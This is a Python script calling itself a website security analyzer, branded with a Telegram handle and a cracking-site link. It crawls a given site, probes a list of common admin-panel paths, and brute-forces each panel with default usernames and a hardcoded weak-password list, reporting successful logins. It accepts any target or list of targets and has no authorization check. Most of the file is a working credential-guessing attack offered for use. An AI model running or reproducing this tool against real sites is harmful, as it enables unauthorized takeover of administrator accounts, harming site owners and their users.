import os
import sys
import requests
import threading
import time
from urllib.parse import urljoin, urlparse
import json
import hashlib
from concurrent.futures import ThreadPoolExecutor
import random

class ChowdhuryVaiSecurityTool:
    def __init__(self):
        self.session = requests.Session()
        self.found_links = set()
        self.admin_panels = set()
        self.common_passwords = []
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.session.headers.update(self.headers)
        
    def load_common_passwords(self):
        """Load common passwords for brute force"""
        self.common_passwords = [
            'admin', 'password', '123456', 'admin123', 'password123',
            'root', 'test', 'guest', '1234', '12345',
            'admin@123', 'Admin@123', 'P@ssw0rd', 'P@ssword123'
        ]
    
    def print_banner(self):
        """Display professional banner with branding"""
        banner = """
\033[95m
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║    \033[96m▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓\033[95m    ║
║    \033[96m▓▓     ▓▓ ▓▓      ▓▓ ▓▓      ▓▓ ▓▓      ▓▓ ▓▓     ▓▓\033[95m    ║
║    \033[96m▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓▓ \033[95m    ║
║    \033[96m▓▓     ▓▓ ▓▓   ▓▓    ▓▓      ▓▓ ▓▓   ▓▓    ▓▓     ▓▓\033[95m    ║
║    \033[96m▓▓▓▓▓▓▓▓▓ ▓▓    ▓▓▓  ▓▓      ▓▓ ▓▓    ▓▓▓ ▓▓▓▓▓▓▓▓▓ \033[95m    ║
║                                                                ║
║              \033[93mADVANCED WEBSITE SECURITY ANALYZER\033[95m              ║
║                    \033[92mBy ChowdhuryVai\033[95m                          ║
║                                                                ║
╠════════════════════════════════════════════════════════════════╣
║ \033[94mTelegram: @darkvaiadmin | Channel: @windowspremiumkey\033[95m       ║
║ \033[94mWebsite: https://crackyworld.com/\033[95m                           ║
╚════════════════════════════════════════════════════════════════╝
\033[0m
        """
        print(banner)
    
    def animate_loading(self, text):
        """Animated loading effect"""
        chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        for i in range(20):
            print(f"\r\033[96m{chars[i % len(chars)]} {text}\033[0m", end="", flush=True)
            time.sleep(0.1)
        print("\r" + " " * 50 + "\r", end="", flush=True)
    
    def check_url(self, url):
        """Check if URL is accessible"""
        try:
            response = self.session.get(url, timeout=10)
            return response.status_code == 200
        except:
            return False
    
    def extract_links(self, url):
        """Extract all links from webpage"""
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                # Simple link extraction from href attributes
                content = response.text.lower()
                links = []
                
                # Find href links
                start = 0
                while True:
                    start = content.find('href="', start)
                    if start == -1:
                        break
                    end = content.find('"', start + 6)
                    if end == -1:
                        break
                    link = content[start+6:end]
                    if link.startswith(('http', '//', '/')):
                        full_url = urljoin(url, link)
                        links.append(full_url)
                    start = end
                
                return list(set(links))
        except:
            pass
        return []
    
    def find_admin_panels(self, base_url):
        """Find admin panel URLs"""
        admin_paths = [
            'admin', 'administrator', 'wp-admin', 'login', 'admin/login',
            'administrator/login', 'panel', 'controlpanel', 'cpanel',
            'webadmin', 'adminarea', 'backend', 'secure', 'manager',
            'system', 'admincp', 'moderator', 'user', 'users', 'account'
        ]
        
        found_panels = []
        
        for path in admin_paths:
            test_url = urljoin(base_url, path)
            if self.check_url(test_url):
                found_panels.append(test_url)
                self.animate_loading(f"Checking admin path: {path}")
        
        return found_panels
    
    def brute_force_login(self, login_url, username):
        """Attempt to brute force login"""
        results = []
        
        for password in self.common_passwords:
            try:
                # Try POST request with common parameters
                data = {
                    'username': username,
                    'password': password,
                    'email': username,
                    'user': username,
                    'pass': password,
                    'login': 'Login',
                    'submit': 'Submit'
                }
                
                response = self.session.post(login_url, data=data, allow_redirects=False, timeout=5)
                
                # Check for successful login indicators
                if response.status_code in [200, 302, 301]:
                    if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
                        results.append(f"SUCCESS: {username}:{password}")
                    elif response.status_code in [302, 301]:
                        results.append(f"POSSIBLE: {username}:{password} (Redirect)")
                
            except Exception as e:
                continue
        
        return results
    
    def scan_website(self, target_url):
        """Main scanning function"""
        print(f"\n\033[92m[*] Starting scan for: {target_url}\033[0m")
        
        # Check if website is accessible
        self.animate_loading("Checking website accessibility")
        if not self.check_url(target_url):
            print(f"\n\033[91m[!] Website is not accessible: {target_url}\033[0m")
            return
        
        print(f"\n\033[92m[+] Website is accessible\033[0m")
        
        # Extract links
        self.animate_loading("Extracting links from website")
        links = self.extract_links(target_url)
        print(f"\n\033[92m[+] Found {len(links)} links\033[0m")
        
        # Find admin panels
        self.animate_loading("Searching for admin panels")
        admin_panels = self.find_admin_panels(target_url)
        
        if admin_panels:
            print(f"\n\033[92m[+] Found {len(admin_panels)} admin panels:\033[0m")
            for panel in admin_panels:
                print(f"    \033[93m{panel}\033[0m")
        else:
            print(f"\n\033[91m[!] No admin panels found\033[0m")
        
        # Brute force found admin panels
        if admin_panels:
            print(f"\n\033[92m[*] Starting brute force attack...\033[0m")
            usernames = ['admin', 'administrator', 'root', 'test', 'user']
            
            for admin_panel in admin_panels:
                print(f"\n\033[96m[*] Testing: {admin_panel}\033[0m")
                
                for username in usernames:
                    self.animate_loading(f"Brute forcing with username: {username}")
                    results = self.brute_force_login(admin_panel, username)
                    
                    if results:
                        print(f"\n\033[92m[+] Successful logins found:\033[0m")
                        for result in results:
                            print(f"    \033[91m{result}\033[0m")
        
        # Generate report
        self.generate_report(target_url, links, admin_panels)
    
    def generate_report(self, target_url, links, admin_panels):
        """Generate scan report"""
        print(f"\n\033[95m" + "="*60 + "\033[0m")
        print(f"\033[95m                   SCAN REPORT\033[0m")
        print(f"\033[95m" + "="*60 + "\033[0m")
        print(f"\033[96mTarget URL: \033[93m{target_url}\033[0m")
        print(f"\033[96mTotal Links Found: \033[93m{len(links)}\033[0m")
        print(f"\033[96mAdmin Panels Found: \033[93m{len(admin_panels)}\033[0m")
        
        if admin_panels:
            print(f"\n\033[96mAdmin Panel URLs:\033[0m")
            for panel in admin_panels:
                print(f"  \033[92m{panel}\033[0m")
        
        print(f"\n\033[95m" + "="*60 + "\033[0m")
        print(f"\033[94mTool by: ChowdhuryVai\033[0m")
        print(f"\033[94mContact: @darkvaiadmin\033[0m")
        print(f"\033[95m" + "="*60 + "\033[0m")
    
    def start_scan(self):
        """Main function to start the scan"""
        self.print_banner()
        self.load_common_passwords()
        
        while True:
            print("\n\033[96m1. Scan Single Website")
            print("2. Scan Multiple Websites")
            print("3. Exit\033[0m")
            
            choice = input("\n\033[93mEnter your choice (1-3): \033[0m").strip()
            
            if choice == '1':
                url = input("\n\033[93mEnter target URL: \033[0m").strip()
                if not url.startswith(('http://', 'https://')):
                    url = 'http://' + url
                
                self.scan_website(url)
                
            elif choice == '2':
                urls_input = input("\n\033[93mEnter URLs (comma separated): \033[0m").strip()
                urls = [url.strip() for url in urls_input.split(',')]
                
                for url in urls:
                    if not url.startswith(('http://', 'https://')):
                        url = 'http://' + url
                    self.scan_website(url)
                    
            elif choice == '3':
                print("\n\033[92mThank you for using ChowdhuryVai Security Tool!\033[0m")
                break
            else:
                print("\n\033[91mInvalid choice! Please try again.\033[0m")

def main():
    """Main execution function"""
    try:
        tool = ChowdhuryVaiSecurityTool()
        tool.start_scan()
    except KeyboardInterrupt:
        print(f"\n\n\033[91m[!] Scan interrupted by user\033[0m")
    except Exception as e:
        print(f"\n\033[91m[!] Error: {str(e)}\033[0m")

if __name__ == "__main__":
    main()
